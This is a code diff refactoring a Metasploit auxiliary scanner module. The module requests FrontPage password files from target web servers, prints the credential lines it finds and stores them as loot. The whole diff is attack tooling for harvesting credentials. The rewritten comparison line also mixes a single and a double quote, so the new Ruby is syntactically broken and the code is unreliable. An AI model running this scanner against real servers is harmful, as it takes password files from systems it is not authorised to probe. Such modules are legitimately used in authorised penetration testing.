@@ -21,8 +21,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Author'         =>
         [
-          'Aditya K Sood @adityaksood - Sparty tool',
-          'averagesecurityguy - Metasploit module'
+          'Aditya K Sood @adityaksood', # Sparty tool',
+          'Stephen Haywood @averagesecguy' # Metasploit module'
         ],
       'License'        => MSF_LICENSE,
     ))
@@ -42,20 +42,21 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
     })
 
-    if res.code == 200
-      vprint_status("Found #{uri}.")
-      if res.body.lines.first.chomp == "# -FrontPage-"
-        vprint_status("Found FrontPage credentials.")
-        return res.body
-      else
-        vprint_status("Filed does not contain FrontPage credentials.")
-        vprint_status(res.body)
-        return nil
-      end
-    else
+    unless res.code == 200
       vprint_status("File #{uri} not found.")
       return nil
     end
+
+    vprint_status("Found #{uri}.")
+
+    unless res.body.lines.first.chomp == '# -FrontPage-"
+      vprint_status("File does not contain FrontPage credentials.")
+      vprint_status(res.body)
+      return nil
+    end
+
+    vprint_status("Found FrontPage credentials.")
+    return res.body
   end
 
   def run_host(ip)
@@ -63,17 +64,18 @@ class MetasploitModule < Msf::Auxiliary
 
     files.each do |filename|
       contents = get_pass_file(filename)
-      if contents != nil
-        print_good("#{ip} - #{filename}")
 
-        contents.each_line do |line|
-          print_good(line.chomp)
-        end
+      next if contents == nil
 
-        print_line("")
+      print_good("#{ip} - #{filename}")
 
-        store_loot("frontpage.pwd.file", "text/plain", ip, contents, filename)
+      contents.each_line do |line|
+        print_good(line.chomp)
       end
+
+      print_line()
+
+      store_loot("frontpage.pwd.file", "text/plain", ip, contents, filename)
     end
   end
 end
